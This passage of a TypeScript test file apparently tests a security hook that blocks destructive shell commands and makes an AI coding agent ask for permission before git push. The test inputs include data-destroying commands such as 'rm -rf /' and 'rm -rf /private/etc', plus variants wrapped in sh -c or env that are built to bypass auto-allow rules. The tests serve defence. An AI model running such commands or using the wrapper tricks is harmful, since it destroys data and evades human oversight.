  // unconditionally — this describe block pins that invariant so that any
  // future refactor that accidentally reintroduces a bypass will fail CI.

  it('should unconditionally block rm -rf / regardless of any caller auto-allow rule', async () => {
    const result = await securityBlocker(createBashInput('rm -rf /'));
    expect(result.continue).toBe(false);
  });

  it('should unconditionally block rmdir on system root', async () => {
    const result = await securityBlocker(createBashInput('rmdir /'));
    expect(result.continue).toBe(false);
  });

  it('should unconditionally block rm -rf on /private/etc', async () => {
    const result = await securityBlocker(createBashInput('rm -rf /private/etc'));
    expect(result.continue).toBe(false);
  });

  it('should unconditionally block rm on /System (macOS system dir)', async () => {
    const result = await securityBlocker(createBashInput('rm -rf /System/Library'));
    expect(result.continue).toBe(false);
  });

  it('should unconditionally block rm wrapped in sh -c (auto-allow bypass attempt)', async () => {
    const result = await securityBlocker(createBashInput(`sh -c 'rm -rf /private/var'`));
    expect(result.continue).toBe(false);
  });

  it('should unconditionally block rmdir wrapped in env prefix (auto-allow bypass attempt)', async () => {
    const result = await securityBlocker(createBashInput('env FOO=bar rm -rf /private/tmp'));
    expect(result.continue).toBe(false);
  });
});

// =============================================================================
// GIT PUSH APPROVAL-FIRST GATE
// =============================================================================

describe('matchesGitPush', () => {
  it.each([
    ['git push', true],
    ['git push origin main', true],
    ['git push --force origin main', true],
    ['git push -u origin feat/x', true],
    ['git push --tags', true],
    ['git  push   origin', true],
    ['git push --help', false],
    ['git status', false],
    ['git commit -m "x"', false],
    ['git log', false],
    ['echo "I will git push later"', true],
    ['ls -la', false],
  ])('returns %s for "%s"', (cmd, expected) => {
    expect(matchesGitPush(cmd as string)).toBe(expected);
  });
});

describe('GIT_PUSH_REGEX', () => {
  it('is exported and matches at word boundary', () => {
    expect(GIT_PUSH_REGEX.test('git push')).toBe(true);
    expect(GIT_PUSH_REGEX.test('gitpush')).toBe(false);
  });
});

describe('git push approval-first gate', () => {
  const origEnv = process.env['CLAUDE_AUTO_APPROVE_PUSH'];

  afterEach(() => {
    if (origEnv === undefined) {
      delete process.env['CLAUDE_AUTO_APPROVE_PUSH'];
    } else {
      process.env['CLAUDE_AUTO_APPROVE_PUSH'] = origEnv;
    }
  });

  it('forces permission prompt for plain git push', async () => {
    delete process.env['CLAUDE_AUTO_APPROVE_PUSH'];
    const result = await securityBlocker(createBashInput('git push'));
    expect(result.continue).toBe(true);
    expect(result.hookSpecificOutput?.permissionDecision).toBe('ask');
  });

  it('forces permission prompt for git push to specific remote/branch', async () => {
    delete process.env['CLAUDE_AUTO_APPROVE_PUSH'];
    const result = await securityBlocker(createBashInput('git push origin feat/x'));
    expect(result.hookSpecificOutput?.permissionDecision).toBe('ask');
  });

  it('forces permission prompt for git push --force', async () => {
    delete process.env['CLAUDE_AUTO_APPROVE_PUSH'];
    const result = await securityBlocker(createBashInput('git push --force origin main'));
    expect(result.hookSpecificOutput?.permissionDecision).toBe('ask');
  });

  it('forces permission prompt for git push --tags', async () => {
    delete process.env['CLAUDE_AUTO_APPROVE_PUSH'];
    const result = await securityBlocker(createBashInput('git push --tags'));
    expect(result.hookSpecificOutput?.permissionDecision).toBe('ask');
  });

  it('allows silently when CLAUDE_AUTO_APPROVE_PUSH=1', async () => {
    process.env['CLAUDE_AUTO_APPROVE_PUSH'] = '1';
    const result = await securityBlocker(createBashInput('git push origin main'));
    expect(result.continue).toBe(true);
    expect(result.hookSpecificOutput?.permissionDecision).toBeUndefined();
    expect(result.suppressOutput).toBe(true);
  });

  it('does not gate other CLAUDE_AUTO_APPROVE_PUSH values (only "1" enables escape)', async () => {
    process.env['CLAUDE_AUTO_APPROVE_PUSH'] = 'true';
    const result = await securityBlocker(createBashInput('git push origin main'));
    expect(result.hookSpecificOutput?.permissionDecision).toBe('ask');
  });

  it('does not gate git push --help (docs-only invocation)', async () => {
    delete process.env['CLAUDE_AUTO_APPROVE_PUSH'];
    const result = await securityBlocker(createBashInput('git push --help'));
    expect(result.continue).toBe(true);
    expect(result.hookSpecificOutput?.permissionDecision).toBeUndefined();
  });

  it('does not gate git status / git commit / git log', async () => {
    delete process.env['CLAUDE_AUTO_APPROVE_PUSH'];
    for (const cmd of ['git status', 'git commit -m "x"', 'git log --oneline']) {
      const result = await securityBlocker(createBashInput(cmd));
      expect(result.hookSpecificOutput?.permissionDecision).toBeUndefined();
    }
  });

  it('still blocks dangerous commands BEFORE checking push gate (precedence)', async () => {
    delete process.env['CLAUDE_AUTO_APPROVE_PUSH'];
    // rm -rf / should still hard-deny; the push gate is later in the chain
    const result = await securityBlocker(createBashInput('rm -rf /'));
    expect(result.continue).toBe(false);
  });
});
